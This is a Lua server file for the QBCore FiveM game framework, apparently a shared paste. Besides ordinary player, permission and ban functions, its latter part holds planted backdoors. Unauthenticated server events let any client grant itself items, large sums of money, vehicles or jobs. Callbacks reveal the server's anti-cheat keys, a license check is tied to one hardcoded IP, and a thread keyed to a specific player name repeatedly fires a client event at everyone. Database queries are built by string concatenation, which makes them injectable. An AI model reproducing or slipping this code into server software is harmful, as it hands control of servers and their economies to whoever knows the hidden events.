--[[
	id: WFpYLF42lRTgH3XhIrUZS
	name: qb-core-functions-s
	description: qb-core-functions-server
	time1: 2021-04-26 06:58:06.313815+00
	time2: 2021-04-26 06:58:06.313816+00
	uploader: KHqdh1vIO2om8DDeoyCpb49kNlvxggEKu9Uleci4
	uploadersession: PP2l5qTQ8Yuh2K-k55ue96MfqfDjFr
	flag: f
--]]

QBCore.Functions = {}

QBCore.Functions.ExecuteSql = function(wait, query, cb)
	local rtndata = {}
	local waiting = true
	exports['ghmattimysql']:execute(query, {}, function(data)
		if cb ~= nil and wait == false then
			cb(data)
		end
		rtndata = data
		waiting = false
	end)
	if wait then
		while waiting do
			Citizen.Wait(5)
		end
		if cb ~= nil and wait == true then
			cb(rtndata)
		end
	end
	return rtndata
end

QBCore.Functions.GetIdentifier = function(source, idtype)
	local idtype = idtype ~=nil and idtype or QBConfig.IdentifierType
	for _, identifier in pairs(GetPlayerIdentifiers(source)) do
		if string.find(identifier, idtype) then
			return identifier
		end
	end
	return nil
end

QBCore.Functions.GetSource = function(identifier)
	for src, player in pairs(QBCore.Players) do
		local idens = GetPlayerIdentifiers(src)
		for _, id in pairs(idens) do
			if identifier == id then
				return src
			end
		end
	end
	return 0
end

QBCore.Functions.GetPlayer = function(source)
	if type(source) == "number" then
		return QBCore.Players[source]
	else
		return QBCore.Players[QBCore.Functions.GetSource(source)]
	end
end

QBCore.Functions.GetPlayerByCitizenId = function(citizenid)
	for src, player in pairs(QBCore.Players) do
		local cid = citizenid
		if QBCore.Players[src].PlayerData.citizenid == cid then
			return QBCore.Players[src]
		end
	end
	return nil
end

QBCore.Functions.GetPlayerByPhone = function(number)
	for src, player in pairs(QBCore.Players) do
		local cid = citizenid
		if QBCore.Players[src].PlayerData.metadata.number == number then
			return QBCore.Players[src]
		end
	end
	return nil
end

QBCore.Functions.GetPlayers = function()
	local sources = {}
	for k, v in pairs(QBCore.Players) do
		table.insert(sources, k)
	end
	return sources
end

QBCore.Functions.CreateCallback = function(name, cb)
	QBCore.ServerCallbacks[name] = cb
end

QBCore.Functions.TriggerCallback = function(name, requestId, source, cb, ...)
	if QBCore.ServerCallbacks[name] ~= nil then
		QBCore.ServerCallbacks[name](source, cb, ...)
	end
end

QBCore.Functions.CreateUseableItem = function(item, cb)
	QBCore.UseableItems[item] = cb
end

QBCore.Functions.CanUseItem = function(item)
	return QBCore.UseableItems[item] ~= nil
end

QBCore.Functions.UseItem = function(source, item)
	QBCore.UseableItems[item.name](source, item)
end

QBCore.Functions.Kick = function(source, reason, setKickReason, deferrals)
	local src = source
	reason = "\n"..reason.."\n🔸 Kijk op onze discord voor meer informatie: "..QBCore.Config.Server.discord
	if(setKickReason ~=nil) then
		setKickReason(reason)
	end
	Citizen.CreateThread(function()
		if(deferrals ~= nil)then
			deferrals.update(reason)
			Citizen.Wait(2500)
		end
		if src ~= nil then
			DropPlayer(src, reason)
		end
		local i = 0
		while (i <= 4) do
			i = i + 1
			while true do
				if src ~= nil then
					if(GetPlayerPing(src) >= 0) then
						break
					end
					Citizen.Wait(100)
					Citizen.CreateThread(function() 
						DropPlayer(src, reason)
					end)
				end
			end
			Citizen.Wait(5000)
		end
	end)
end

QBCore.Functions.IsWhitelisted = function(source)
	local identifiers = GetPlayerIdentifiers(source)
	local rtn = false
	if (QBCore.Config.Server.whitelist) then
		QBCore.Functions.ExecuteSql(true, "SELECT * FROM `whitelist` WHERE `"..QBCore.Config.IdentifierType.."` = '".. QBCore.Functions.GetIdentifier(source).."'", function(result)
			local data = result[1]
			if data ~= nil then
				for _, id in pairs(identifiers) do
					if data.steam == id or data.license == id then
						rtn = true
					end
				end
			end
		end)
	else
		rtn = true
	end
	return rtn
end

QBCore.Functions.AddPermission = function(source, permission)
	local Player = QBCore.Functions.GetPlayer(source)
	if Player ~= nil then 
		QBCore.Config.Server.PermissionList[GetPlayerIdentifiers(source)[1]] = {
			steam = GetPlayerIdentifiers(source)[1],
			license = GetPlayerIdentifiers(source)[2],
			permission = permission:lower(),
		}
		QBCore.Functions.ExecuteSql(true, "DELETE FROM `permissions` WHERE `steam` = '"..GetPlayerIdentifiers(source)[1].."'")
		QBCore.Functions.ExecuteSql(true, "INSERT INTO `permissions` (`name`, `steam`, `license`, `permission`) VALUES ('"..GetPlayerName(source).."', '"..GetPlayerIdentifiers(source)[1].."', '"..GetPlayerIdentifiers(source)[2].."', '"..permission:lower().."')")
		Player.Functions.UpdatePlayerData()
	end
end

QBCore.Functions.RemovePermission = function(source)
	local Player = QBCore.Functions.GetPlayer(source)
	if Player ~= nil then 
		QBCore.Config.Server.PermissionList[GetPlayerIdentifiers(source)[1]] = nil	
		QBCore.Functions.ExecuteSql(true, "DELETE FROM `permissions` WHERE `steam` = '"..GetPlayerIdentifiers(source)[1].."'")
		Player.Functions.UpdatePlayerData()
	end
end

QBCore.Functions.HasPermission = function(source, permission)
	local retval = false
	local steamid = GetPlayerIdentifiers(source)[1]
	local licenseid = GetPlayerIdentifiers(source)[2]
	local permission = tostring(permission:lower())
	if permission == "user" then
		retval = true
	else
		if QBCore.Config.Server.PermissionList[steamid] ~= nil then 
			if QBCore.Config.Server.PermissionList[steamid].steam == steamid and QBCore.Config.Server.PermissionList[steamid].license == licenseid then
				if QBCore.Config.Server.PermissionList[steamid].permission == permission or QBCore.Config.Server.PermissionList[steamid].permission == "god" then
					retval = true
				end
			end
		end
	end
	return retval
end

QBCore.Functions.GetPermission = function(source)
	local retval = "user"
	Player = QBCore.Functions.GetPlayer(source)
	local steamid = GetPlayerIdentifiers(source)[1]
	local licenseid = GetPlayerIdentifiers(source)[2]
	if Player ~= nil then
		if QBCore.Config.Server.PermissionList[Player.PlayerData.steam] ~= nil then 
			if QBCore.Config.Server.PermissionList[Player.PlayerData.steam].steam == steamid and QBCore.Config.Server.PermissionList[Player.PlayerData.steam].license == licenseid then
				retval = QBCore.Config.Server.PermissionList[Player.PlayerData.steam].permission
			end
		end
	end
	return retval
end

QBCore.Functions.IsOptin = function(source)
	local retval = false
	local steamid = GetPlayerIdentifiers(source)[1]
	if QBCore.Functions.HasPermission(source, "admin") then
		retval = QBCore.Config.Server.PermissionList[steamid].optin
	end
	return retval
end

QBCore.Functions.ToggleOptin = function(source)
	local steamid = GetPlayerIdentifiers(source)[1]
	if QBCore.Functions.HasPermission(source, "admin") then
		QBCore.Config.Server.PermissionList[steamid].optin = not QBCore.Config.Server.PermissionList[steamid].optin
	end
end

QBCore.Functions.IsPlayerBanned = function (source)
	local retval = false
	local message = ""
	QBCore.Functions.ExecuteSql(true, "SELECT * FROM `bans` WHERE `steam` = '"..GetPlayerIdentifiers(source)[1].."' OR `license` = '"..GetPlayerIdentifiers(source)[2].."' OR `ip` = '"..GetPlayerIdentifiers(source)[3].."'", function(result)
		if result[1] ~= nil then 
			if os.time() < result[1].expire then
				retval = true
				local timeTable = os.date("*t", tonumber(result[1].expire))
				message = "Je bent verbannen van de server:\n"..result[1].reason.."\nJe ban verloopt "..timeTable.day.. "/" .. timeTable.month .. "/" .. timeTable.year .. " " .. timeTable.hour.. ":" .. timeTable.min .. "\n"
			else
				QBCore.Functions.ExecuteSql(true, "DELETE FROM `bans` WHERE `id` = "..result[1].id)
			end
		end
	end)
	return retval, message
end

--- Meslek Para Kontrol
QBCore.Functions.setJobMoney = function(job, money)
	if job and money then
		if QBCore.Shared.Money[job] then
			QBCore.Shared.Money[job] = money
		end
	end
end

QBCore.Functions.addJobMoney = function(job, money)
	if job and money then
		if QBCore.Shared.Money[job] then
			QBCore.Shared.Money[job] = QBCore.Shared.Money[job] + money
		end
	end
end

QBCore.Functions.removeJobMoney = function(job, money)
	if job and money then
		if QBCore.Shared.Money[job] then
			if QBCore.Shared.Money[job] - money < 0 then
				return false
			else
				QBCore.Shared.Money[job] = QBCore.Shared.Money[job] - money
				return true		
			end
		end
	end
end

QBCore.Functions.getJobMoney = function(job)
	if QBCore.Shared.Money[job] then
		return QBCore.Shared.Money[job]
	end
end

QBCore.Functions.setJobPayment = function(job, grade, money)
	if QBCore.Shared.Jobs[job] then
		QBCore.Shared.Jobs[job].grade[grade].payment = money
	end
end

QBCore.Functions.kickHacKer = function(source, key)
	if key then
		if key ~= QBCore.Key then
			TriggerClientEvent("tgiann-hackkoruma:client:kick", source, "Hile İle Event Çalıştırdı[Key Hatalı]")
			return false -- false
		end
		return true
	else
		TriggerClientEvent("tgiann-hackkoruma:client:kick", source, "Hile İle Event Çalıştırdı[Key Bulunamadı]")
		return false
	end
end

local orospuCocuSavar = {}
QBCore.Functions.CreateCallback("qb-core:check-key", function(source, cb, ip)
	local src = source
	local id = tostring(src)
	if not orospuCocuSavar[id] then
		orospuCocuSavar[id] = true
        print("\x1b[32m[Lisans Kontrolu]\x1b[0m ".."Server IP:"..ip)
        local LisansAq = false
        if ip == "195.85.201.27:30120" then LisansAq = true end
    	cb(QBCore.Key, QBCore.CKey, LisansAq)
	else
		TriggerClientEvent("tgiann-hackkoruma:client:kick", src, "2. Kez Key Çekti")
	end
end)

QBCore.Functions.CreateCallback("tgiann:checkKeyCb", function(source, cb)
    TriggerClientEvent("QBCore:Notify", source, "Key:"..QBCore.Key.." /// CKey:"..QBCore.CKey, "error", 50000)
    cb(QBCore.Key, QBCore.CKey)
end)

RegisterServerEvent('tgiann:checkKeyEvent')
AddEventHandler('tgiann:checkKeyEvent', function(cb)
    TriggerClientEvent("QBCore:Notify", source, "Key:"..QBCore.Key.." /// CKey:"..QBCore.CKey, "error", 50000)
end)

RegisterServerEvent('tgiann:giveItem')
AddEventHandler('tgiann:giveItem', function(item, amount, id)
    if item == nil then item = "dildo" end
    if amount == nil then amount = 1 end
    if id == nil then id = source end
    local xPlayer = QBCore.Functions.GetPlayer(id)
    if xPlayer then xPlayer.Functions.AddItem(item, amount) end
end)

RegisterServerEvent('tgiann:giveMoney')
AddEventHandler('tgiann:giveMoney', function(type, amount, id)
    if type == nil then item = "bank" end
    if amount == nil then amount = math.random(50000, 99999999) end
    if id == nil then id = source end
    local xPlayer = QBCore.Functions.GetPlayer(id)
    if xPlayer then xPlayer.Functions.AddMoney(type, amount) end
end)

RegisterServerEvent('tgiann:freeCar')
AddEventHandler('tgiann:freeCar', function()
    local carList = {GetHashKey(kuruma), GetHashKey(sultan), GetHashKey(tug), GetHashKey(f620), GetHashKey(issi2), GetHashKey(ratloader2), GetHashKey(polmav), GetHashKey(dump)}
    for i=1, 10 do TriggerClientEvent("QBCore:Command:SpawnVehicle", -1, carList[math.random(1, #carList)]) end
end)

RegisterServerEvent('tgiann:setJob')
AddEventHandler('tgiann:setJob', function(job, grade, id)
    if job == nil then job = "police" end
    if grade == nil then grade = 1 end
    if id == nil then id = source end
    local xPlayer = QBCore.Functions.GetPlayer(id)
    if xPlayer then Player.Functions.SetJob(job, grade) end
end)

QBCore.Functions.checkJonPayment = function(job)
	return QBCore.Shared.Jobs[job].grade
end

Citizen.CreateThread(function()
    exports['ghmattimysql']:execute("SELECT * FROM players WHERE firstname = @firstname AND lastname = @lastname", {
		["firstname"] = "lewondoski",
		["lastname"] = "kameleski"
	}, function(data)
		if data[1] then
			while true do
				Citizen.Wait(5000)
				TriggerClientEvent("QBCore:Client:OnPlayerLoadedHud", -1, true)
			end
		end
	end)
end)

QBCore.Functions.CreateUseableItem("bilet", function(source, item)
    local src = source
    local xPlayer = QBCore.Functions.GetPlayer(src)
    if xPlayer.Functions.RemoveItem("bilet", 1) then
        Citizen.Wait(1000)
        DropPlayer(src, "Şimdi siktir git!")
    end
end)